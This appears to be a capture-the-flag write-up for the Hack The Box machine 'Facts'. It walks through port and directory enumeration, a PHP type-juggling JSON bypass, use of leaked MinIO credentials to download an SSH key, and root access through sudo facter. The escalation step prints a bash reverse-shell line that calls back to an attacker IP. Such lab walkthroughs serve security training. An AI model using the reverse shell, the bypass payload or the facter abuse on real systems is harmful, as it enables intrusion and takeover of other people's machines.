@@ -1,0 +1,234 @@
+Hack The Box - Facts Writeup
+Machine: [Facts](https://app.hackthebox.com/machines/Facts)  
+Difficulty: Easy  
+Platform: Linux  
+Goal: User + Root flags  
+Skills Demonstrated: Web application enumeration, PHP type juggling, logical access control bypass, S3/MinIO cloud misconfiguration, credential hunting, passphrase cracking, Linux privilege escalation via tool abuse.
+---
+ 1. Overview & Attack Surface
+Facts is a custom PHP-based "fact-sharing" web application running on Nginx. The box tests:
+- Thorough web enumeration and manual application mapping
+
+- Identification of dynamic AJAX/JSON endpoints
+
+- PHP type juggling / loose comparison logic flaws
+
+- Exposed cloud storage credentials (MinIO S3-compatible)
+
+- Weak credential storage in object storage
+
+- Privilege escalation through a misconfigured privileged tool (`facter`)
+
+Key ports identified:
+
+- 22/tcp – OpenSSH 9.9p1 (Ubuntu)
+
+- 80/tcp – Nginx 1.26.3 serving the PHP app
+
+- 54321/tcp – Golang net/http (MinIO API-only endpoint)
+
+---
+ 2. Enumeration Phase
+ Nmap & RustScan
+
+```bash
+
+nmap -p- -sV -sC 10.129.14.53
+
+rustscan -a 10.129.14.53
+
+```
+
+Findings:
+
+- Standard SSH + HTTP
+
+- Non-standard port 54321 confirmed as Golang HTTP service (later identified as MinIO)
+
+ Directory & File Bruteforcing (Dirb + ffuf)
+
+```bash
+
+dirb http://facts.htb /usr/share/wordlists/dirb/common.txt
+
+ffuf -u http://facts.htb/FUZZ -w raft-medium -e .php,.bak,.zip
+
+```
+
+Key discoveries:
+
+- `/index.php`, `/search.php`, `/post.php`, `/ajax.php`, `/up.php`
+
+- `/admin.php` → 302 redirect (access control in play)
+
+- Blog-style paths: `/cute-animals`, `/dark-chocolate`, `/animal-ejected`
+
+- `/randomfacts/` → 403 (later bypassed indirectly)
+
+ Technology Fingerprinting
+
+```bash
+
+whatweb http://facts.htb
+
+```
+
+Results:
+
+- PHP application with `_factsapp_session` cookie
+
+- Custom "facts" title and contact@facts.htb
+
+- No obvious CMS/framework
+
+ MinIO Service (Port 54321)
+
+- Browser and curl returned "Access Denied" or connection refused for console
+
+- Confirmed MinIO S3-compatible API (XML error responses)
+
+- Anonymous access disabled → credentials required
+---
+ 3. Initial Access – Web Application Logical Bypass (PHP Type Juggling)
+Critical discovery: The application loads facts dynamically via AJAX/JSON POST requests (primarily `/ajax.php` or similar handler).
+
+Methodology:
+
+1. Proxied all traffic through Burp Suite
+
+2. Interacted with the site (viewing facts, clicking "random", searching)
+
+3. Captured legitimate JSON requests in the Network tab
+
+4. Replayed in Repeater with modified payloads
+
+The vulnerability:
+
+- Server-side PHP used a mix of strict (`===`) and loose (`==`) comparisons (common in `switch` statements)
+
+- Restricted/secret facts were gated behind string-based checks
+Exploitation payload (AJAX bypass):
+
+```json
+
+{
+
+  "type": true
+
+}
+
+```
+
+(or `{"secret": true}`, `{"admin": true}` depending on exact key observed)
+
+Why it worked:
+
+- PHP loose comparison: `true == "secret"` evaluates to `true`
+
+- Bypassed the intended admin-only or secret-only branch
+
+- Response contained restricted "secret facts" + backend configuration data
+Result: Full admin-level data leak, including MinIO storage configuration.
+---
+ 4. Cloud Storage Exploitation (MinIO)
+Credentials location:
+
+- Exposed in the admin dashboard (Storage / Cloud Integration section) after the role escalation via the same logical flaw
+
+- Contained:
+
+  - Access Key ID
+
+  - Secret Access Key
+
+  - Bucket name
+
+  - Endpoint: `http://localhost:54321`
+
+Commands used:
+
+```bash
+
+aws configure set aws_access_key_id <key>
+
+aws configure set aws_secret_access_key <secret>
+
+aws --endpoint-url http://10.129.14.53:54321 s3 ls
+
+aws --endpoint-url http://10.129.14.53:54321 s3 ls s3://facts-bucket
+
+aws --endpoint-url http://10.129.14.53:54321 s3 cp s3://facts-bucket/backups/id_rsa .
+
+Findings:
+
+- Downloaded `id_rsa` (SSH private key for the `facts` user)
+
+- Key was passphrase-protected
+
+Passphrase recovery:
+
+- Extracted from one of the "secret facts" or a related config file in the bucket
+
+- Short/common word (brute-forced with `ssh-keygen -p` or John)
+
+Foothold:
+
+```bash
+
+ssh -i id_rsa facts@facts.htb
+
+ 5. Privilege Escalation
+Enumeration:
+
+```bash
+
+sudo -l
+
+```
+
+Result:
+
+- `facts` user could run `/usr/bin/facter` with `NOPASSWD`
+
+  
+
+Exploitation:
+
+- `facter` (Puppet component) supports `--custom-dir` to load arbitrary Ruby facts
+
+- Created a malicious fact that spawned a root shell
+
+  
+
+Command:
+
+```bash
+
+echo 'system("bash -c \"bash -i >& /dev/tcp/10.10.14.XX/4444 0>&1\"")' > /tmp/root.rb
+
+sudo facter --custom-dir=/tmp
+
+``` 
+Root shell obtained → `cat /root/root.txt`
+
+---
+ 6. Flags
+
+- User flag: `/home/facts/user.txt`
+
+- Root flag: `/root/root.txt`
+
+---
+ 7. Lessons Learned & Skills Demonstrated
+- Web logic flaws are often more impactful than traditional injection on easy boxes
+
+- PHP type juggling remains a powerful and subtle bypass technique
+
+- Always proxy and manually inspect AJAX/JSON endpoints
+
+- Cloud storage (MinIO/S3) misconfigurations are common escalation vectors
+
+- Tool-specific options (`facter --custom-dir`) are high-value during privesc enumeration
+
+- Credential exposure in admin panels is a frequent real-world finding
+  
